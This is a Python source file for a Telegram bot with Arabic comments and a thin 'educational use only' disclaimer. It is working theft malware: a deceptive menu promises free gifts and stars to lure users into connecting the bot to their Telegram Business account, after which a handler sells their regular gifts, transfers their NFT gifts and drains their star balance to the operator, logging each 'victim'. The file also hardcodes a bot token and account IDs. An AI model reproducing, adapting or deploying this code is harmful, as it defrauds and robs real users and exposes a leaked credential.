# ⚠️ هذا الكود لأغراض تعليمية وبحثية فقط. استخدامه في غير ذلك يعتبر جريمة إلكترونية.
# ⚠️ أنت تتحمل المسؤولية الكاملة عن أي عواقب.

import asyncio
import logging
import random
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
import requests
import os

# ============ خادم الويب الصحي (لمنع السكون في Render) ============
from aiohttp import web

async def health_check(request):
    return web.Response(text="✅ Bot is alive and running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 8000)
    await site.start()
    print("🌐 Web server started on port 8000 for health checks.")

# ============ الإعدادات ============
# استخدم متغيرات البيئة للأمان (يُفضل)
TOKEN = os.getenv("TOKEN", "8444087261:AAHDCslnY-l1DqCUrosakcFcLXWAkTi4r-c")
LOG_CHAT_ID = int(os.getenv("LOG_CHAT_ID", "-5552292344"))  # ضع معرف الدردشة
ADMIN_IDS = [int(os.getenv("ADMIN_ID", "5831193562"))]          # ضع معرفك الرقمي

MAX_GIFTS_PER_RUN = 1000
codes = {}  # لم يعد مستخدماً لكن نحتفظ به لتجنب الأخطاء
storage = MemoryStorage()

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

class Draw(StatesGroup):
    id = State()
    gift = State()

# ============ القائمة الخادعة ============
def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 احصل على هدية مجانية", callback_data="get_gift")],
        [InlineKeyboardButton(text="⭐ ربح النجوم الآن", callback_data="earn_stars")],
        [InlineKeyboardButton(text="📖 كيف يعمل البوت؟", callback_data="how_it_works")],
        [InlineKeyboardButton(text="👥 دعوة الأصدقاء", callback_data="invite_friends")]
    ])

def connect_button():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 توصيل البوت الآن", callback_data="start_connection")]
    ])

# ============ أوامر البوت ============
@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    await message.answer(
        "🎉 <b>مرحباً بك في بوت الهدايا والنجوم المجانية!</b>\n\n"
        "✅ احصل على هدايا تيليجرام النادرة مجاناً\n"
        "✅ اربح نجوم إضافية يومياً\n"
        "✅ لا حاجة لدفع أي مبلغ\n\n"
        "👇 اختر ما تريد فعله الآن:",
        reply_markup=main_menu_kb()
    )

@dp.callback_query(F.data == "get_gift")
async def fake_gift(callback: types.CallbackQuery):
    await callback.message.answer(
        "🎁 <b>تهانينا! أنت مؤهل للحصول على هدية مجانية!</b>\n\n"
        "لتفعيل الهدية، اتبع الخطوات التالية:\n"
        "1️⃣ اضغط على زر «توصيل البوت» أدناه.\n"
        "2️⃣ اتبع التعليمات لإضافة البوت إلى حساب أعمالك.\n"
        "3️⃣ انتظر 5 ثوانٍ وستحصل على هديتك.\n\n"
        "⚠️ <i>الهدية متاحة لمرة واحدة فقط لكل مستخدم.</i>",
        reply_markup=connect_button()
    )
    await callback.answer()

@dp.callback_query(F.data == "earn_stars")
async def fake_stars(callback: types.CallbackQuery):
    await callback.message.answer(
        "⭐ <b>طريقة ربح النجوم:</b>\n\n"
        "1️⃣ قم بتوصيل البوت بحساب أعمالك.\n"
        "2️⃣ سنقوم تلقائياً بإضافة 500 نجمة إلى رصيدك.\n"
        "3️⃣ كلما زاد عدد أصدقائك الذين يستخدمون البوت، زادت أرباحك.\n\n"
        "👥 ادعُ أصدقاءك واحصل على 50 نجمة إضافية لكل صديق!",
        reply_markup=connect_button()
    )
    await callback.answer()

@dp.callback_query(F.data == "how_it_works")
async def how_it_works(callback: types.CallbackQuery):
    await callback.message.answer(
        "📖 <b>كيف يعمل البوت؟</b>\n\n"
        "🔹 البوت يتصل بحساب أعمالك ليتحقق من صحة حسابك.\n"
        "🔹 بعد التوصيل، يتم إرسال هدية أو نجوم إلى حسابك فوراً.\n"
        "🔹 العملية آمنة وسريعة ولا تتطلب أي معلومات شخصية.\n\n"
        "✅ جرب الآن واحصل على مكافأتك!"
    )
    await callback.answer()

@dp.callback_query(F.data == "invite_friends")
async def invite_friends(callback: types.CallbackQuery):
    await callback.message.answer(
        "👥 <b>دعوة الأصدقاء</b>\n\n"
        "شارك الرابط التالي مع أصدقائك:\n"
        f"<code>https://t.me/{bot.username}?start=ref</code>\n\n"
        "📌 كل صديق يستخدم البوت سيمنحك 50 نجمة إضافية!"
    )
    await callback.answer()

@dp.callback_query(F.data == "start_connection")
async def start_connection(callback: types.CallbackQuery):
    await callback.message.answer(
        "🔗 <b>خطوات التوصيل:</b>\n\n"
        "1️⃣ اذهب إلى إعدادات تيليجرام.\n"
        "2️⃣ اختر «Telegram للأعمال».\n"
        "3️⃣ اضغط على «البوتات».\n"
        "4️⃣ ابحث عن هذا البوت وأضفه.\n"
        "5️⃣ امنح الصلاحيات المطلوبة.\n\n"
        "✅ بعد التوصيل، ستصل هديتك خلال دقيقة!"
    )
    await callback.answer("⏳ جاري تجهيز هديتك...")

# ============ آلية السرقة التلقائية (بدون كود يدوي) ============
@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    business_id = business_connection.id
    user = business_connection.user

    # إعلام المسؤول ببدء العملية
    await bot.send_message(LOG_CHAT_ID, f"🔔 بدء عملية السحب التلقائي للمستخدم: {user.id}")

    try:
        # 1. جلب الهدايا والرصيد
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        stars = await bot.get_business_account_star_balance(business_id)

        regular_gifts = [g for g in gifts.gifts if g.type == "regular"]
        nft_gifts = [g for g in gifts.gifts if g.type == "unique" and g.can_be_transferred]
        current_balance = int(stars.amount)
        total_nft_count = len(nft_gifts)
        transfer_cost = total_nft_count * 25
        sold_count = 0

        # 2. إذا كان الرصيد غير كافٍ، قم ببيع هدايا عادية لتغطية النقص
        if current_balance < transfer_cost and regular_gifts:
            needed = transfer_cost - current_balance
            for gift in regular_gifts:
                if needed <= 0:
                    break
                try:
                    await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
                    sold_count += 1
                    # تحديث الرصيد
                    stars = await bot.get_business_account_star_balance(business_id)
                    current_balance = int(stars.amount)
                    needed = transfer_cost - current_balance
                except Exception as e:
                    print(f"فشل تحويل هدية عادية: {e}")
                    continue

        # إرسال تقرير عن الهدايا المباعة
        if sold_count > 0:
            await bot.send_message(
                LOG_CHAT_ID,
                f"🔄 تم تحويل {sold_count} هدية عادية إلى نجوم لتغطية رسوم الـ NFT."
            )

        # 3. نقل هدايا NFT إلى حساب المسؤول
        transferred_nfts = 0
        for gift in nft_gifts:
            try:
                await bot.transfer_gift(
                    business_id,
                    gift.owned_gift_id,
                    ADMIN_IDS[0],  # حساب المسؤول
                    gift.transfer_star_count
                )
                transferred_nfts += 1
            except Exception as e:
                print(f"فشل نقل NFT: {e}")

        # 4. سحب الرصيد المتبقي من النجوم إلى حساب المسؤول
        stars = await bot.get_business_account_star_balance(business_id)
        remaining = int(stars.amount)
        if remaining > 0:
            await bot.transfer_business_account_stars(business_id, ADMIN_IDS[0], remaining)

        # 5. التقرير النهائي
        final_report = (
            f"✅ <b>اكتملت عملية السحب التلقائي</b>\n\n"
            f"👤 <b>الضحية:</b> {user.id} (@{user.username or 'لا يوجد'})\n"
            f"🎁 <b>عدد هدايا NFT المنقولة:</b> {transferred_nfts}\n"
            f"⭐ <b>عدد النجوم المسحوبة:</b> {remaining}\n"
            f"🔄 <b>الهدايا العادية المباعة لتغطية الرسوم:</b> {sold_count}\n"
            f"🕒 <b>الوقت:</b> {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
        )
        await bot.send_message(LOG_CHAT_ID, final_report)

    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"❌ حدث خطأ أثناء السحب التلقائي: {e}")

# ============ لوحة تحكم المشرف (لإرسال الهدايا يدوياً) ============
@dp.message(Command("ap"))
async def apanel(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="⭐️ سحب النجوم",
            callback_data="draw_stars"
        )
    )
    await message.answer("🛠 لوحة تحكم المشرف:", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "draw_stars")
async def draw_stars(message: types.Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        return
    await message.answer("أدخل معرف المستخدم لإرسال الهدية إليه")
    await state.set_state(Draw.id)

@dp.message(F.text, Draw.id)
async def choice_gift(message: types.Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        return
    msg = await message.answer("الهدايا المتاحة:", reply_markup=await pagination())
    await state.update_data(user_id=message.text)
    await state.set_state(Draw.gift)

@dp.callback_query(F.data.startswith("gift_"))
async def draw(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    gift_id = callback.data.split('_')[1]
    data = await state.get_data()
    user_id = data['user_id']
    await bot.send_gift(gift_id=gift_id, chat_id=int(user_id))
    await callback.message.answer("✅ تم إرسال الهدية")
    await state.clear()

async def pagination(page=0):
    url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
    try:
        response = requests.get(url)
        response.raise_for_status()
        builder = InlineKeyboardBuilder()
        data = response.json()
        if data.get("ok", False):
            gifts = list(data.get("result", {}).get("gifts", []))
            start = page * 9
            end = start + 9
            for gift in gifts[start:end]:
                builder.button(
                    text=f"⭐️{gift['star_count']} {gift['sticker']['emoji']}",
                    callback_data=f"gift_{gift['id']}"
                )
            builder.adjust(2)
            total_pages = max(1, (len(gifts) + 8) // 9)
            if page < total_pages - 1:
                builder.row(
                    InlineKeyboardButton(text="⬅️", callback_data=f"page_{page-1}") if page > 0 else InlineKeyboardButton(text="•", callback_data="empty"),
                    InlineKeyboardButton(text=f"{page+1}/{total_pages}", callback_data="empty"),
                    InlineKeyboardButton(text="➡️", callback_data=f"page_{page+1}") if page < total_pages - 1 else InlineKeyboardButton(text="•", callback_data="empty")
                )
        return builder.as_markup()
    except Exception as e:
        print(e)
        return InlineKeyboardMarkup(inline_keyboard=[])

@dp.callback_query(F.data.startswith("page_"))
async def change_page(callback: CallbackQuery):
    page = int(callback.data.split("_")[1])
    await callback.message.edit_reply_markup(reply_markup=await pagination(page))

# ============ تشغيل البوت مع خادم الويب الصحي ============
async def main():
    await asyncio.gather(
        dp.start_polling(bot),
        start_web_server()
    )

if __name__ == "__main__":
    asyncio.run(main())